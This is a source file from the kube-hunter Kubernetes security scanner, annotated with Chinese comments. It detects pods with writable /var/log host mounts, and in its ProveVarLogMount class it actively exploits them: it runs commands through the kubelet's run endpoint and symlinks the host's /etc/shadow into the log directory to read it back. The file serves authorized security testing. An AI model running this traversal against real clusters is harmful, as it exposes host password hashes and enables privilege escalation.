# `kubehunter\kube_hunter\modules\hunting\mounts.py`

```py
# 导入 logging 模块
import logging
# 导入 re 模块，用于正则表达式操作
import re
# 导入 uuid 模块，用于生成唯一标识符
import uuid
# 从 kube_hunter.conf 模块中导入 config 对象
from kube_hunter.conf import config
# 从 kube_hunter.core.events 模块中导入 handler 函数
from kube_hunter.core.events import handler
# 从 kube_hunter.core.events.types 模块中导入 Event 和 Vulnerability 类
from kube_hunter.core.events.types import Event, Vulnerability
# 从 kube_hunter.core.types 模块中导入 ActiveHunter, Hunter, KubernetesCluster, PrivilegeEscalation 类
from kube_hunter.core.types import (
    ActiveHunter,
    Hunter,
    KubernetesCluster,
    PrivilegeEscalation,
)
# 从 kube_hunter.modules.hunting.kubelet 模块中导入 ExposedPodsHandler, ExposedRunHandler, KubeletHandlers 类
from kube_hunter.modules.hunting.kubelet import (
    ExposedPodsHandler,
    ExposedRunHandler,
    KubeletHandlers,
)

# 获取名为 __name__ 的 logger 对象
logger = logging.getLogger(__name__)


# 创建 WriteMountToVarLog 类，继承自 Vulnerability 和 Event 类
class WriteMountToVarLog(Vulnerability, Event):
    """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""

    # 初始化方法
    def __init__(self, pods):
        # 调用父类的初始化方法
        Vulnerability.__init__(
            self, KubernetesCluster, "Pod With Mount To /var/log", category=PrivilegeEscalation, vid="KHV047",
        )
        # 设置 pods 属性
        self.pods = pods
        # 设置 evidence 属性
        self.evidence = "pods: {}".format(", ".join((pod["metadata"]["name"] for pod in self.pods)))


# 创建 DirectoryTraversalWithKubelet 类，继承自 Vulnerability 和 Event 类
class DirectoryTraversalWithKubelet(Vulnerability, Event):
    """An attacker can run commands on pods with mount to /var/log,
    and traverse read all files on the host filesystem"""

    # 初始化方法
    def __init__(self, output):
        # 调用父类的初始化方法
        Vulnerability.__init__(
            self, KubernetesCluster, "Root Traversal Read On The Kubelet", category=PrivilegeEscalation,
        )
        # 设置 output 属性
        self.output = output
        # 设置 evidence 属性
        self.evidence = "output: {}".format(self.output)


# 使用 handler.subscribe 装饰器注册 ExposedPodsHandler 事件的处理函数
@handler.subscribe(ExposedPodsHandler)
# 创建 VarLogMountHunter 类，继承自 Hunter 类
class VarLogMountHunter(Hunter):
    """Mount Hunter - /var/log
    Hunt pods that have write access to host's /var/log. in such case,
    the pod can traverse read files on the host machine
    """

    # 初始化方法
    def __init__(self, event):
        # 设置 event 属性
        self.event = event
    # 检查给定的 pod 数据中是否存在与指定路径相关的可写挂载的卷
    def has_write_mount_to(self, pod_data, path):
        """Returns volume for correlated writable mount"""
        # 遍历 pod 数据中的卷列表
        for volume in pod_data["spec"]["volumes"]:
            # 检查卷是否为主机路径类型
            if "hostPath" in volume:
                # 检查主机路径类型是否为目录
                if "Directory" in volume["hostPath"]["type"]:
                    # 检查主机路径是否以指定路径开头
                    if volume["hostPath"]["path"].startswith(path):
                        # 如果是，则返回该卷
                        return volume

    # 执行方法
    def execute(self):
        # 初始化存储符合条件的 pod 列表
        pe_pods = []
        # 遍历事件中的 pod 列表
        for pod in self.event.pods:
            # 检查 pod 是否存在与指定路径相关的可写挂载的卷
            if self.has_write_mount_to(pod, path="/var/log"):
                # 如果存在，则将该 pod 添加到符合条件的 pod 列表中
                pe_pods.append(pod)
        # 如果符合条件的 pod 列表不为空
        if pe_pods:
            # 发布 WriteMountToVarLog 事件，包含符合条件的 pod 列表
            self.publish_event(WriteMountToVarLog(pods=pe_pods))
# 订阅 ExposedRunHandler 事件的处理程序类
@handler.subscribe(ExposedRunHandler)
class ProveVarLogMount(ActiveHunter):
    """Prove /var/log Mount Hunter
    Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
    """
    # 初始化方法，接收事件对象作为参数
    def __init__(self, event):
        self.event = event
        self.base_path = f"https://{self.event.host}:{self.event.port}"

    # 运行方法，接收命令和容器对象作为参数
    def run(self, command, container):
        run_url = KubeletHandlers.RUN.value.format(
            podNamespace=container["namespace"], podID=container["pod"], containerName=container["name"], cmd=command,
        )
        return self.event.session.post(f"{self.base_path}/{run_url}", verify=False).text

    # 获取挂载到 /var/log 的容器方法
    # TODO: 替换为对 WriteMountToVarLog 的多次订阅
    def get_varlog_mounters(self):
        logger.debug("accessing /pods manually on ProveVarLogMount")
        pods = self.event.session.get(
            f"{self.base_path}/" + KubeletHandlers.PODS.value, verify=False, timeout=config.network_timeout,
        ).json()["items"]
        for pod in pods:
            volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
            if volume:
                yield pod, volume

    # 根据挂载名称获取挂载路径的方法
    def mount_path_from_mountname(self, pod, mount_name):
        """returns container name, and container mount path correlated to mount_name"""
        for container in pod["spec"]["containers"]:
            for volume_mount in container["volumeMounts"]:
                if volume_mount["name"] == mount_name:
                    logger.debug(f"yielding {container}")
                    yield container, volume_mount["mountPath"]
    # 定义一个方法，用于在主机上读取文件内容，并清除尾部空白字符
    def traverse_read(self, host_file, container, mount_path, host_path):
        # 生成一个随机的符号链接名
        symlink_name = str(uuid.uuid4())
        # 创建指向文件的符号链接
        self.run(f"ln -s {host_file} {mount_path}/{symlink_name}", container)
        # 使用 kubelet 跟随符号链接
        path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(
            path=re.sub(r"^/var/log", "", host_path) + symlink_name
        )
        # 通过会话对象获取符号链接指向的文件内容
        content = self.event.session.get(
            f"{self.base_path}/{path_in_logs_endpoint}", verify=False, timeout=config.network_timeout,
        ).text
        # 删除符号链接
        self.run(f"rm {mount_path}/{symlink_name}", container=container)
        # 返回文件内容
        return content

    # 执行方法
    def execute(self):
        # 遍历获取 /var/log 挂载点的容器
        for pod, volume in self.get_varlog_mounters():
            # 遍历每个容器和挂载路径
            for container, mount_path in self.mount_path_from_mountname(pod, volume["name"]):
                logger.debug("Correlated container to mount_name")
                # 构建容器信息
                cont = {
                    "name": container["name"],
                    "pod": pod["metadata"]["name"],
                    "namespace": pod["metadata"]["namespace"],
                }
                try:
                    # 调用 traverse_read 方法读取 /etc/shadow 文件内容
                    output = self.traverse_read(
                        "/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"],
                    )
                    # 发布事件，包含读取到的内容
                    self.publish_event(DirectoryTraversalWithKubelet(output=output))
                except Exception:
                    logger.debug("Could not exploit /var/log", exc_info=True)
```